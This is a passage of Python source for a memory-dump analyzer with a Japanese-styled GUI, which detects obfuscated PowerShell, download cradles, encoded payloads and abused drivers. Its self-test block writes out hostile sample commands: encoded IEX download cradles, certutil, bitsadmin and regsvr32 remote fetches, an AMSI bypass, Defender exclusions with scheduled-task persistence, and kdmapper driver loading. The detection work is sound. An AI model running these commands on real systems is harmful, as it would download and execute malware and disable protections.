        if transport and SEV_ORDER.get(sev, 0) > SEV_ORDER["low"]:
            sev = "low"
            why += " [transport context - severity capped]"
        ctx.add("Evasion Technique", sev, offset, work, why, layer=layer, host=host,
                dedupe_key="ev:" + m.group(0).lower()[:80])


RE_KERNEL_GATE = re.compile(
    r"(?i)\.sys\b|\\device\\|\\driver\\|kdmapper|mapper|winio|gdrv|rtcore|iqvw|"
    r"dbk|msio|ntio|phymem|physmem|\\registry\\machine"
)


def kernel_scan(work: str, offset: int, ctx: ScanContext):
    if not RE_KERNEL_GATE.search(work):
        return
    m = RE_VULN_DRIVER.search(work)
    if m:
        ctx.add("Kernel Artifact", "high", offset, work,
                f"known vulnerable/abused driver: {m.group(0)}")
    m = RE_MAPPER.search(work)
    if m:
        ctx.add("Kernel Artifact", "high", offset, work, f"driver mapper indicator: {m.group(0)}")
    for obj in RE_KERNEL_OBJ.finditer(work):
        ctx.add("Kernel Artifact", "info", offset, obj.group(0), "kernel object path")
    for svc in RE_SVC_REG.finditer(work):
        ctx.add("Kernel Artifact", "low", offset, svc.group(0), "service registry key")


def decode_and_recurse(work: str, offset: int, ctx: ScanContext, layer: int, host: str):
    """Find encoded payloads, decode them, and re-run the analyzers on each layer."""
    if layer >= MAX_LAYER or not ctx.decode_budget():
        return

    # transport-heavy window (JSON transcript / chat log): commands found in
    # decoded blobs are quoted content, not execution - cap their severity
    transported = _window_transport(work)

    decoded_items = []  # (kind, text)

    # -EncodedCommand / -e arguments (PowerShell uses UTF-16LE)
    for m in RE_ENC_B64_ARG.finditer(work):
        raw = b64_decode_flexible(m.group(1))
        if raw:
            decoded_items.append(("EncodedCommand", raw))

    # generic base64 blobs (only worthwhile when context hints at scripting)
    if re.search(r"(?i)iex|icm|invoke-|download|webclient|script|http|frombase64|"
                 r"encodedcommand|-enc\b|\bcommand\b", work):
        for m in RE_B64_BLOB.finditer(work):
            raw = b64_decode_flexible(m.group(1))
            if raw and len(raw) >= 12:
                decoded_items.append(("base64", raw))

    # hex blobs
    for m in RE_HEX_SEP.finditer(work):
        raw = _hex_decode(m.group(0))
        if raw:
            decoded_items.append(("hex", raw))
    for m in RE_HEX_PLAIN.finditer(work):
        raw = _hex_decode(m.group(0))
        if raw:
            decoded_items.append(("hex", raw))

    # percent-encoded runs
    for m in RE_PCT_ENC.finditer(work):
        try:
            from urllib.parse import unquote
            txt = unquote(m.group(0))
            if txt and printable_ratio(txt.encode("utf-8", errors="replace")) > 0.8:
                decoded_items.append(("percent-encoding", txt.encode("utf-8", errors="replace")))
        except Exception:
            pass

    for kind, raw in decoded_items:
        if not ctx.decode_budget():
            break
        if len(raw) > 1_000_000:  # cap decode work on pathological blobs
            raw = raw[:1_000_000]
        if raw[:2] == b"\x1f\x8b" or raw[:1] == b"\x78":
            try:
                raw = gzip.decompress(raw) if raw[:2] == b"\x1f\x8b" else zlib.decompress(raw)
            except (OSError, zlib.error, ValueError):
                pass
        txt = bytes_to_text(raw)
        if len(txt) < 8 or printable_ratio(txt.encode("utf-8", errors="replace")) < 0.75:
            continue
        # report the layer
        if re.search(r"(?i)iex|icm|invoke-|http|download|webclient|amsi|-{1,2}enc|cmd|powershell|"
                     r"regsvr|mshta|rundll|schtasks|bypass|\bsys\b|driver", txt):
            sev = "high" if layer == 1 else "medium"
            if transported and SEV_ORDER.get(sev, 0) > SEV_ORDER["low"]:
                sev = "low"
            ctx.add("Encoded Payload", sev, offset,
                    txt[:160], f"{kind} payload decoded (layer {layer})"
                               + (" [transport context - severity capped]" if transported else ""),
                    host=host, layer=layer, dedupe_key="dec:" + txt[:100])
            # follow any URL found inside decoded content
            cradle_scan(txt[:MAX_STRING_ANALYZE], offset, ctx, layer, host,
                        transport=transported)
        analyze_window(txt, offset, ctx, layer + 1, "decoded")


def _hex_decode(blob: str):
    cleaned = re.sub(r"(?i)0x|[\s,]", "", blob)
    if len(cleaned) < 32 or len(cleaned) % 2:
        return None
    try:
        return bytes.fromhex(cleaned)
    except ValueError:
        return None


# ---- one streaming buffer --------------------------------------------------
def _extract_ascii_window(buf: bytes, anchor: int):
    """Return the printable ASCII run containing buf[anchor] (or None)."""
    lo = max(0, anchor - WINDOW_CONTEXT_BACK)
    hi = min(len(buf), anchor + WINDOW_CONTEXT_FWD)
    for m in RE_ASCII_STR.finditer(buf, lo, hi):
        if m.start() <= anchor < m.end():
            return m
    return None


def _extract_utf16_window(buf: bytes, anchor: int):
    """Return the UTF-16LE printable run containing buf[anchor] (match obj)."""
    lo = max(0, anchor - 2 * WINDOW_CONTEXT_BACK)
    hi = min(len(buf), anchor + 2 * WINDOW_CONTEXT_FWD)
    for m in RE_UTF16_STR.finditer(buf, lo, hi):
        if m.start() <= anchor < m.end():
            return m
    return None


def process_buffer(buf: bytes, data_start: int, ctx: ScanContext, stats: dict, fp_table: dict,
                   accept_lo: int = 0, accept_hi: int = None):
    """Analyze one buffer. Anchors are only accepted for absolute offsets in
    [accept_lo, accept_hi) so parallel span workers can read overlap context
    without double-reporting."""
    if accept_hi is None:
        accept_hi = data_start + len(buf)

    # binary markers (C speed)
    for m in RE_DOS_STUB.finditer(buf):
        abs_off = data_start + m.start()
        if accept_lo <= abs_off < accept_hi:
            if not ctx.add("PE Image in Memory", "info", max(0, abs_off - 64),
                           "MZ image (DOS stub) resident in memory", "a PE file is loaded/mapped"):
                break
    for m in list(RE_GZIP_MAGIC.finditer(buf))[:20]:
        abs_off = data_start + m.start()
        if accept_lo <= abs_off < accept_hi:
            ctx.add("Compressed Blob", "info", abs_off,
                    "gzip-compressed blob resident in memory", "possible packed script/payload")

    # skip near-empty buffers (huge zero runs in hibernation/pagefile dumps)
    if buf.count(b"\x00") > len(buf) - 64:
        return

    # ---- stage 1: C-speed token scan (ASCII, on lowercased buffer) ----
    low_buf = buf.lower()
    anchors = _find_anchors(low_buf, RE_CANDIDATE_TOKENS_LOWER_BYTES, MAX_WINDOWS_PER_CHUNK)
    stride = 1
    if len(anchors) > MAX_WINDOWS_PER_CHUNK:
        stride = -(-len(anchors) // MAX_WINDOWS_PER_CHUNK)
        stats["sampled"] = stats.get("sampled", 0) + len(anchors) - len(anchors[::stride])

    for a in anchors[::stride]:
        abs_a = data_start + a
        if abs_a < accept_lo or abs_a >= accept_hi:
            continue
        # content fingerprint dedupe (cheap, before window extraction)
        fp = buf[a:a + 48]
        cnt = fp_table.get(fp, 0)
        if cnt >= 3:
            continue
        if len(fp_table) < MAX_FP_KEYS:
            fp_table[fp] = cnt + 1
        elif fp not in fp_table:
            pass
        m = _extract_ascii_window(buf, a)
        if m is None:
            continue
        content = m.group().decode("ascii", errors="replace")
        if not content.strip():
            continue
        stats["windows"] = stats.get("windows", 0) + 1
        analyze_window(content, data_start + m.start(), ctx, 1, "ascii")

    # ---- stage 2: UTF-16LE candidates via de-interleaved views ----
    n = len(buf)
    for phase in (0, 1):
        view = buf[phase::2].decode("latin-1").lower()
        u_anchors = _find_anchors(view, RE_CANDIDATE_TOKENS_LOWER_STR, MAX_WINDOWS_PER_CHUNK)
        if not u_anchors:
            continue
        u_stride = 1
        if len(u_anchors) > MAX_WINDOWS_PER_CHUNK:
            u_stride = -(-len(u_anchors) // MAX_WINDOWS_PER_CHUNK)
            stats["sampled"] = stats.get("sampled", 0) + len(u_anchors) - len(u_anchors[::u_stride])
        for av in u_anchors[::u_stride]:
            a = phase + 2 * av  # byte offset in buf
            abs_a = data_start + a
            if abs_a < accept_lo or abs_a >= accept_hi:
                continue
            fp = buf[a:a + 96]
            cnt = fp_table.get(fp, 0)
            if cnt >= 3:
                continue
            if len(fp_table) < MAX_FP_KEYS:
                fp_table[fp] = cnt + 1
            m = _extract_utf16_window(buf, a)
            if m is None:
                continue
            content = m.group().replace(b"\x00", b"").decode("ascii", errors="replace")
            if not content.strip():
                continue
            stats["windows"] = stats.get("windows", 0) + 1
            analyze_window(content, data_start + m.start(), ctx, 1, "utf16")


# ---- file scan driver -------------------------------------------------------
def scan_range(path: str, ctx: ScanContext, span_start: int, span_end: int,
               stats: dict, fp_table: dict, total: int):
    """Scan byte range [span_start, span_end) with internal chunk/overlap logic.
    Reads OVERLAP bytes of context on each side, but only anchors whose absolute
    offset falls inside the span are analyzed (no cross-worker duplicates)."""
    read_lo = max(0, span_start - (OVERLAP if span_start > 0 else 0))
    read_hi = min(total, span_end + OVERLAP)
    with open(path, "rb") as f:
        f.seek(read_lo)
        pos = read_lo
        prev_tail = b""
        while pos < read_hi:
            chunk = f.read(min(CHUNK_SIZE, read_hi - pos))
            if not chunk:
                break
            buf = prev_tail + chunk
            data_start = pos - len(prev_tail)
            process_buffer(buf, data_start, ctx, stats, fp_table, span_start, span_end)
            pos += len(chunk)
            prev_tail = chunk[-OVERLAP:]


def _worker_scan(task):
    """Pool worker: scan one span, return its findings and stats."""
    path, span_start, span_end, min_sev, total = task
    ctx = ScanContext(max_findings=10**9, min_severity=min_sev)
    stats = {"windows": 0, "sampled": 0}
    fp_table = {}
    scan_range(path, ctx, span_start, span_end, stats, fp_table, total)
    return ctx.findings, stats


def scan_file(path: str, ctx: ScanContext, progress_cb=None, quiet=False, workers: int = 1):
    total = os.path.getsize(path)
    t0 = time.time()
    stats = {"windows": 0, "sampled": 0}

    if workers <= 1 or total <= 64 * 1024 * 1024:
        fp_table = {}
        with open(path, "rb") as f:
            pos = 0
            prev_tail = b""
            chunk_no = 0
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                buf = prev_tail + chunk
                data_start = pos - len(prev_tail)
                process_buffer(buf, data_start, ctx, stats, fp_table)
                pos += len(chunk)
                prev_tail = chunk[-OVERLAP:]
                chunk_no += 1
                if progress_cb:
                    progress_cb(min(pos, total), total, len(ctx.findings), stats)
                elif not quiet and chunk_no % 8 == 0:
                    pct = pos * 100 // total if total else 100
                    sys.stdout.write(f"\r  scanned {pos/(1024*1024):,.0f} MiB / {total/(1024*1024):,.0f} MiB "
                                     f"({pct}%)  findings: {len(ctx.findings)}   ")
                    sys.stdout.flush()
    else:
        # parallel spans, chunk-aligned
        n_spans = workers
        span = -(-total // n_spans)
        span = max(span, CHUNK_SIZE)
        spans = []
        s = 0
        while s < total:
            spans.append((path, s, min(s + span, total), ctx.min_sev, total))
            s += span
        spans[-1] = (spans[-1][0], spans[-1][1], total, ctx.min_sev, total)

        done_bytes = 0
        try:
            import multiprocessing
            from concurrent.futures import ProcessPoolExecutor, as_completed
            with ProcessPoolExecutor(max_workers=workers) as pool:
                futures = [pool.submit(_worker_scan, t) for t in spans]
                for fut in as_completed(futures):
                    try:
                        part_findings, part_stats = fut.result()
                    except Exception as exc:  # noqa: BLE001
                        sys.stderr.write(f"\n  [worker error] {exc}\n")
                        continue
                    for fnd in part_findings:
                        ctx.add(fnd.engine, fnd.severity, fnd.offset, fnd.excerpt,
                                fnd.detail, fnd.level_score, fnd.level_name,
                                fnd.host, fnd.layer)
                    stats["windows"] += part_stats.get("windows", 0)
                    stats["sampled"] += part_stats.get("sampled", 0)
                    done_bytes += min(span, total - done_bytes if total - done_bytes > 0 else 0)
                    if progress_cb:
                        progress_cb(min(done_bytes, total), total, len(ctx.findings), stats)
                    elif not quiet:
                        sys.stdout.write(f"\r  spans completed: {sum(1 for x in futures if x.done())}"
                                         f"/{len(spans)}  findings: {len(ctx.findings)}   ")
                        sys.stdout.flush()
        except (ImportError, OSError):
            # fallback to single-threaded if pool unavailable
            fp_table = {}
            scan_range(path, ctx, 0, total, stats, fp_table, total)

    if not quiet and not progress_cb:
        elapsed = time.time() - t0
        sys.stdout.write(f"\n  scan finished in {elapsed:,.1f}s\n")
    return stats


# ----------------------------------------------------------------------------
# Reports
# ----------------------------------------------------------------------------
def write_json(ctx: ScanContext, path: str, source: str):
    data = {
        "tool": APP_NAME,
        "version": APP_VERSION,
        "generated": datetime.now().isoformat(timespec="seconds"),
        "source": source,
        "total_findings": len(ctx.findings),
        "truncated": ctx.truncated,
        "findings": [
            {
                "engine": f.engine, "severity": f.severity, "offset": f.offset,
                "offset_hex": hex(f.offset), "level_score": f.level_score,
                "level": f.level_name, "host": f.host, "layer": f.layer,
                "excerpt": f.excerpt, "detail": f.detail, "seen": f.seen,
            }
            for f in sorted(ctx.findings, key=Finding.sort_key, reverse=True)
        ],
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2, ensure_ascii=False)


def write_csv(ctx: ScanContext, path: str):
    with open(path, "w", encoding="utf-8-sig", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["engine", "severity", "offset", "offset_hex", "obfuscation_level",
                    "score", "host", "layer", "seen", "excerpt", "detail"])
        for f in sorted(ctx.findings, key=Finding.sort_key, reverse=True):
            w.writerow([f.engine, f.severity, f.offset, hex(f.offset), f.level_name,
                        f.level_score, f.host, f.layer, f.seen, f.excerpt, f.detail])


def write_txt(ctx: ScanContext, path: str, source: str):
    sev_rank = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(f"{APP_NAME} v{APP_VERSION} - report\n")
        fh.write(f"generated : {datetime.now().isoformat(timespec='seconds')}\n")
        fh.write(f"source    : {source}\n")
        fh.write(f"findings  : {len(ctx.findings)}{' (TRUNCATED)' if ctx.truncated else ''}\n")
        fh.write("=" * 78 + "\n\n")
        counts = summary_counts(ctx)
        for k, v in counts.items():
            fh.write(f"  {k:<28} {v}\n")
        fh.write("=" * 78 + "\n\n")
        for f in sorted(ctx.findings, key=lambda x: (sev_rank.get(x.severity, 9), -x.level_score, x.offset)):
            loc = f"[layer {f.layer}] " if f.layer > 1 else ""
            host = f" host={f.host}" if f.host else ""
            lvl = f" obfuscation={f.level_name} ({f.level_score}/100)" if f.level_name else ""
            seen = f" [seen {f.seen}x]" if f.seen > 1 else ""
            fh.write(f"{f.severity.upper():<8} {f.engine:<24} @ 0x{f.offset:X}{host}{lvl}{seen}\n")
            fh.write(f"   {f.detail}\n")
            fh.write(f"   > {truncate(f.excerpt, 400)}\n\n")


def summary_counts(ctx: ScanContext):
    counts = {}
    for f in ctx.findings:
        k = f"{f.engine} / {f.severity}"
        counts[k] = counts.get(k, 0) + 1
    return dict(sorted(counts.items()))


# ----------------------------------------------------------------------------
# Self-test (synthetic dump)
# ----------------------------------------------------------------------------
SELFTEST_BLOBS = [
    # 1 - encodedcommand + hidden cradle (critical chain)
    b"powershell.exe -nop -w hidden -noni -enc "
    + base64.b64encode(
        "IEX(New-Object Net.WebClient).DownloadString('http://185.62.190.44/mo.pt1')".encode("utf-16-le")
    ),
    # 2 - cmd caret-obfuscated curl download + rename
    b"cmd.exe /c c^u^r^l http://cdn.jsdelivr.io/payload/x.exe -o %APPDATA%\\RtkAudUService64.exe && start %APPDATA%\\RtkAudUService64.exe",
    # 3 - concatenated URL + iex cradle
    b"$c = ('htt' + 'ps://past' + 'ebin.com/raw/x9K2a'); iex (New-Object Net.WebClient).DownloadString($c)",
    # 4 - char-code URL construction
    b"[char[]](104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109) -join ''",
    # 5 - certutil with defanged URL
    b"certutil -urlcache -split -f hxxp://sync.serveo.net/up.dll %TEMP%\\sh.dll",
    # 6 - bitsadmin transfer
    b"bitsadmin /transfer j0b /download /priority high http://files.baddomain.net/svchost.exe C:\\Windows\\Temp\\svc.exe",
    # 7 - vulnerable driver + mapper
    b"C:\\Users\\user\\AppData\\Local\\Temp\\kdmapper.exe --driver C:\\temp\\iqvw64e.sys --target kernelcheat.sys",
    b"\\Driver\\rtcore64 port device mapped physical memory",
    # 8 - amsi bypass inside base64
    b"$d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YW1zaUluaXRGYWlsZWQ=')); set-item variable:globals:$d",
    # 9 - regsvr32 squiblydoo
    b"regsvr32.exe /s /n /u /i:http://x.x.x.x/update.sct scrobj.dll",
    # 10 - random-cased iex + tick escapes (very high)
    b"I`n`v`o`k`e-`E`x`p`r`e`s`s`i`o`n ( $( 'h'+'ttp'+'://mm' + '.onion.ps1' ) )",
    # 11 - percent-encoded URL in cmd
    b"cmd /c curl %68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%2f%70%2e%65%78%65 -o out.exe",
    # 12 - defender tampering + persistence
    b"Add-MpPreference -ExclusionPath 'C:\\Users\\Public'; schtasks /create /tn OneDriveSync /sc onlogon /tr powershell -enc AAAA",
    # 13 - cheat brand + keyauth
    b"skeet.cc loader session, keyauth.win/api/1.2/ hwid check OK, user: testpc",
    # 14 - PE stub
    b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF This program cannot be run in DOS mode.",
    # 15 - injection API
    b"kernel32.CreateRemoteThreadEx hProcess=0x1a4 WriteProcessMemory lpBaseAddress=0x7ff6",
    # 16 - gzip-compressed script blob resident in memory
    gzip.compress(b"iex (new-object net.webclient).downloadstring('http://gz.stage.net/w.ps1')"),
    # 17 - gzip inside base64 within a command context
    b"powershell -c iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"
    + base64.b64encode(gzip.compress(b"schtasks /create /tn upd /tr http://x.y/z.exe"))
    + b"'))",
    # 18 - benign noise
    b"The quick brown fox jumps over the lazy dog near the river bank every morning.",
    b"Microsoft (R) Windows Operating System Version 10.0.22631.4312",
]


def run_selftest(min_severity="low"):
    import tempfile
    payload = b""
    filler = (b"user32.dll GetForegroundWindow Steam/steamapps/common Paradise_Killer "
              b"explorer.exe svchost.exe \x00\x00")
    for blob in SELFTEST_BLOBS:
        payload += filler + blob + filler + b"\n\x00\x00"

    fd, test_path = tempfile.mkstemp(suffix=".dmp", prefix="rda_selftest_")
    os.close(fd)
    # pad to several chunks (with overlap) to exercise boundary logic - O(n) build
    fill_target = CHUNK_SIZE * 2 + 1024
    pad = (fill_target // len(payload) + 1) * payload
    payload = payload + pad
    with open(test_path, "wb") as fh:
        fh.write(payload)
    try:
        # info floor so every engine (incl. PE/compressed markers) gets verified
        ctx = ScanContext(min_severity="info")
        scan_file(test_path, ctx, quiet=True)
        engines = {}
        for f in ctx.findings:
            engines.setdefault(f.engine, []).append(f)
        print(BANNER)
        print(f"  selftest dump: {test_path}")
        print(f"  findings: {len(ctx.findings)}\n")
        for eng in ENGINES:
            if eng in engines:
                print(f"  [OK]   {eng}: {len(engines[eng])} finding(s)")
            else:
                print(f"  [MISS] {eng}")
        print("\n  detail sample:")
        shown = 0
        for f in sorted(ctx.findings, key=Finding.sort_key, reverse=True):
            if shown >= 14:
                break
            lvl = f" [{f.level_name} {f.level_score}/100]" if f.level_name else ""
            host = f" host={f.host}" if f.host else ""
            print(f"   {f.severity.upper():<8} {f.engine:<24}{lvl}{host}  > {truncate(f.excerpt, 110)}")
            shown += 1

        required = ("PS/CMD Obfuscation", "Download Cradle", "Encoded Payload",
                    "Evasion Technique", "Kernel Artifact", "Cheat/Loader Indicator",
                    "Injection API", "PE Image in Memory")
        missing = [e for e in required if e not in engines]
        print()
        if missing:
            print(f"  SELFTEST FAILED - engines missing: {missing}")
            return 1
        print("  SELFTEST PASSED - all required engines produced findings.")
        return 0
    finally:
        try:
            os.remove(test_path)
        except OSError:
            pass


# ----------------------------------------------------------------------------
# GUI
# ----------------------------------------------------------------------------
def hide_console():
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def run_gui():
    import tkinter as tk
    from tkinter import filedialog, messagebox, ttk

    # ---------------- Japanese palette ----------------
    NIGHT = "#0f1420"      # night ink (window)
    PANEL = "#161d2e"      # indigo washi panel
    PANEL2 = "#101724"     # darker field
    EDGE = "#232f4a"       # panel lines
    INK = "#e8e6df"        # washi text
    FAINT = "#8a93a6"
    TORII = "#c73e3a"      # torii vermillion
    TORII_HI = "#e05252"
    GOLD = "#c9a227"
    SAKURA = "#f4a7b9"
    SEV_COLORS = {"critical": "#ff5c5c", "high": "#ff9f45", "medium": "#ffd166",
                  "low": "#6fb3ff", "info": "#7a8499"}

    result = {"findings": [], "source": ""}
    q = queue.Queue()
    scanning = {"active": False}

    root = tk.Tk()
    root.title(f"{APP_NAME} v{APP_VERSION} — 日本RAMアナライザー (3-in-1)")
    root.geometry("1200x760")
    root.minsize(940, 620)
    root.configure(bg=NIGHT)

    # runtime window icon: hinomaru tile (matches the exe icon)
    try:
        ph = tk.PhotoImage(width=32, height=32)
        for yy in range(32):
            for xx in range(32):
                if 4 <= xx < 28 and 4 <= yy < 28:
                    dx, dy = xx - 16, yy - 15
                    if dx * dx + dy * dy <= 11 * 11:
                        ph.put("#bc002d", (xx, yy))
                    else:
                        ph.put("#f7f5ee", (xx, yy))
        root.iconphoto(True, ph)
        root._icon_ref = ph
    except Exception:
        pass

    # ---------------- background art canvas ----------------
    bg = tk.Canvas(root, bg=NIGHT, highlightthickness=0)
    bg.pack(fill="both", expand=True)
    art_state = {"size": (0, 0)}

    def draw_art(w, h):
        bg.delete("art")
        # vertical night gradient
        steps = 40
        for i in range(steps):
            y0 = h * i / steps
            y1 = h * (i + 1) / steps + 2
            f = i / (steps - 1)
            rr = int(0x0f + (0x14 - 0x0f) * f)
            gg = int(0x14 + (0x1e - 0x14) * f)
            bb = int(0x20 + (0x30 - 0x20) * f)
            bg.create_rectangle(0, y0, w, y1, fill=f"#{rr:02x}{gg:02x}{bb:02x}",
                                outline="", tags=("art",))
        # rising sun (dim, upper right)
        sr = min(w, h) * 0.21
        sx, sy = w * 0.87, h * 0.15
        bg.create_oval(sx - sr, sy - sr, sx + sr, sy + sr,
                       fill="#2a1520", outline="#472731", tags=("art",))
        bg.create_oval(sx - sr * 0.8, sy - sr * 0.8, sx + sr * 0.8, sy + sr * 0.8,
                       fill="#31181f", outline="", tags=("art",))
        # seigaiha (wave) arcs, bottom-left
        step = 92
        for row in range(6):
            for col in range(8):
                cx = -50 + col * step + (step // 2 if row % 2 else 0)
                cy = h + 36 - row * step * 0.62
                for radd in (82, 64, 46, 28):
                    bg.create_arc(cx - radd, cy - radd, cx + radd, cy + radd,
                                  start=0, extent=180, outline="#1a2438", width=2,
                                  style="arc", tags=("art",))
        # mt. fuji silhouette, bottom right
        fw, fh = w * 0.30, h * 0.26
        fx, fy = w * 0.80, h
        bg.create_polygon(
            fx - fw / 2, fy, fx - fw * 0.16, fy - fh, fx - fw * 0.10, fy - fh * 0.92,
            fx - fw * 0.04, fy - fh, fx + fw * 0.04, fy - fh, fx + fw * 0.10, fy - fh * 0.92,
            fx + fw * 0.16, fy - fh, fx + fw / 2, fy,
            fill="#141c2e", outline="", tags=("art",))
        bg.create_polygon(
            fx - fw * 0.16, fy - fh, fx - fw * 0.10, fy - fh * 0.92,
            fx - fw * 0.04, fy - fh, fx + fw * 0.04, fy - fh,
            fx + fw * 0.10, fy - fh * 0.92, fx + fw * 0.16, fy - fh,
            fill="#253048", outline="", tags=("art",))
        # torii silhouette, bottom left
        tw, th = 96, 118
        tx0, ty0 = int(w * 0.045), int(h * 0.70)
        c = "#2c161a"
        bg.create_rectangle(tx0 - 16, ty0, tx0 + tw + 16, ty0 + 13, fill=c, outline="", tags=("art",))
        bg.create_rectangle(tx0 - 6, ty0 + 24, tx0 + tw + 6, ty0 + 32, fill=c, outline="", tags=("art",))
        bg.create_rectangle(tx0 + 16, ty0 + 13, tx0 + 28, ty0 + th, fill=c, outline="", tags=("art",))
        bg.create_rectangle(tx0 + tw - 28, ty0 + 13, tx0 + tw - 16, ty0 + th, fill=c, outline="", tags=("art",))
        bg.create_rectangle(tx0 + tw / 2 - 4, ty0 + 13, tx0 + tw / 2 + 4, ty0 + 24,
                            fill=c, outline="", tags=("art",))
        # sakura petals
        import math as _m
        import random as _r
        rng = _r.Random(2026)
        for _ in range(16):
            px = rng.uniform(w * 0.05, w * 0.72)
            py = rng.uniform(h * 0.10, h * 0.88)
            s = rng.uniform(7, 12)
            bg.create_oval(px - s, py - s * 0.55, px + s, py + s * 0.55,
                           fill="#33222b", outline="", tags=("art",))
            bg.create_line(px - s, py, px + s, py, fill="#281b22", tags=("art",))

    def on_bg_configure(event):
        w, h = event.width, event.height
        lw, lh = art_state["size"]
        if abs(w - lw) > 8 or abs(h - lh) > 8:
            art_state["size"] = (w, h)
            draw_art(w, h)

    root.bind("<Configure>", on_bg_configure)

    # ---------------- floating washi panel ----------------
    panel = tk.Frame(bg, bg=PANEL, bd=0, highlightthickness=1, highlightbackground=GOLD)
    win = bg.create_window(14, 14, anchor="nw", window=panel)

    def fit_panel():
        w = max(900, bg.winfo_width() - 28)
        h = max(560, bg.winfo_height() - 28)
        bg.itemconfigure(win, width=w, height=h)

    root.bind("<Configure>", lambda e: (on_bg_configure(e), fit_panel()))

    panel.columnconfigure(0, weight=1)
    panel.rowconfigure(5, weight=1)

    # ---------------- header ----------------
    hc = tk.Canvas(panel, width=34, height=34, bg=PANEL, highlightthickness=0)
    hc.create_oval(4, 4, 30, 30, fill=TORII, outline=GOLD, width=1)
    hc.grid(row=0, column=0, sticky="w", padx=(16, 10), pady=(14, 2))
    ht = tk.Frame(panel, bg=PANEL)
    ht.grid(row=0, column=1, sticky="w", pady=(12, 2))
    tk.Label(ht, text=APP_NAME, bg=PANEL, fg=INK,
             font=("Segoe UI", 15, "bold")).pack(anchor="w")
    tk.Label(ht, text="ラムダンプ解析 — RAM・PowerShell・カーネル (3-in-1)",
             bg=PANEL, fg=SAKURA, font=("Segoe UI", 8)).pack(anchor="w")
    tk.Label(panel, text="authorized inspection only / 正規の調査のみ",
             bg=PANEL, fg=FAINT, font=("Segoe UI", 8)).grid(row=0, column=2, sticky="e",
                                                            padx=16, pady=(14, 2))
    panel.columnconfigure(2, weight=0)

    # ---------------- file row ----------------
    fr = tk.Frame(panel, bg=PANEL)
    fr.grid(row=1, column=0, columnspan=3, sticky="ew", padx=16, pady=(8, 4))
    tk.Label(fr, text="Dump / script file:", bg=PANEL, fg=INK).pack(side="left")
    path_var = tk.StringVar()
    tk.Entry(fr, textvariable=path_var, bg="#0d1322", fg=INK, insertbackground=INK,
             relief="flat", width=72).pack(side="left", padx=8, fill="x", expand=True)

    def browse():
        p = filedialog.askopenfilename(title="Select RAM dump / kernel dump / script",
                                       filetypes=[("All files", "*.*")])
        if p:
            path_var.set(p)

    def jbutton(parent, text, cmd, bgc=TORII, fgc="#ffffff", pad=14):
        return tk.Button(parent, text=text, command=cmd, bg=bgc, fg=fgc,
                         activebackground=TORII_HI if bgc == TORII else EDGE,
                         activeforeground="#ffffff", relief="flat", bd=0,
                         padx=pad, pady=6, font=("Segoe UI", 9, "bold"), cursor="hand2")

    jbutton(fr, "参照... Browse", browse, bgc="#233052", fgc=GOLD, pad=10).pack(side="left")

    # ---------------- progress row ----------------
    bar = tk.Frame(panel, bg=PANEL)
    bar.grid(row=2, column=0, columnspan=3, sticky="ew", padx=16, pady=4)
    style = ttk.Style(root)
    try:
        style.theme_use("clam")
    except Exception:
        pass
    style.configure("Japan.Horizontal.TProgressbar", trough="#1b2438", background=TORII,
                    bordercolor="#1b2438", lightcolor=TORII, darkcolor=TORII)
    progress = ttk.Progressbar(bar, mode="determinate", length=430,
                               style="Japan.Horizontal.TProgressbar")
    progress.pack(side="left", padx=(0, 12))
    status_var = tk.StringVar(value="Idle. Select a dump file and press Start Scan / 解析開始.")
    tk.Label(bar, textvariable=status_var, bg=PANEL, fg=FAINT,
             font=("Consolas", 9)).pack(side="left")

    # ---------------- filter row ----------------
    filt = tk.Frame(panel, bg=PANEL)
    filt.grid(row=3, column=0, columnspan=3, sticky="ew", padx=16, pady=4)
    tk.Label(filt, text="Engine:", bg=PANEL, fg=INK).pack(side="left")
    engine_var = tk.StringVar(value="All")
    engine_cb = ttk.Combobox(filt, textvariable=engine_var, state="readonly", width=23,
                             values=["All"] + list(ENGINES), style="Japan.TCombobox")
    engine_cb.pack(side="left", padx=(2, 10))
    tk.Label(filt, text="Severity:", bg=PANEL, fg=INK).pack(side="left")
    sev_var = tk.StringVar(value="All")
    sev_cb = ttk.Combobox(filt, textvariable=sev_var, state="readonly", width=10,
                          values=["All", "critical", "high", "medium", "low", "info"],
                          style="Japan.TCombobox")
    sev_cb.pack(side="left", padx=(2, 10))
    tk.Label(filt, text="Obfuscation:", bg=PANEL, fg=INK).pack(side="left")
    lvl_var = tk.StringVar(value="All")
    lvl_cb = ttk.Combobox(filt, textvariable=lvl_var, state="readonly", width=10,
                          values=["All", "Basic", "Low", "Medium", "High", "Very High", "Extreme"],
                          style="Japan.TCombobox")
    lvl_cb.pack(side="left", padx=(2, 10))
    search_var = tk.StringVar()
    tk.Entry(filt, textvariable=search_var, bg="#0d1322", fg=INK, insertbackground=INK,
             relief="flat", width=26).pack(side="left", padx=(2, 4))
    tk.Label(filt, text="= filter / 検索", bg=PANEL, fg=FAINT).pack(side="left")
    style.configure("Japan.TCombobox", fieldbackground="#0d1322", background="#1b2438",
                    foreground=INK, arrowcolor=GOLD, bordercolor=EDGE, lightcolor=EDGE)
    style.map("Japan.TCombobox", fieldbackground=[("readonly", "#0d1322")],
              foreground=[("readonly", INK)])

    # ---------------- results tree ----------------
    cols = ("severity", "engine", "level", "hits", "offset", "excerpt")
    tree_frame = tk.Frame(panel, bg=PANEL)
    tree_frame.grid(row=5, column=0, columnspan=3, sticky="nsew", padx=16, pady=6)
    tree_frame.columnconfigure(0, weight=1)
    tree_frame.rowconfigure(0, weight=1)
    tree = ttk.Treeview(tree_frame, columns=cols, show="headings", selectmode="browse",
                        style="Japan.Treeview")
    widths = {"severity": 78, "engine": 160, "level": 118, "hits": 52, "offset": 100, "excerpt": 520}
    for c in cols:
        tree.heading(c, text=c.title() if c != "offset" else "Offset")
        tree.column(c, width=widths[c], anchor="w")
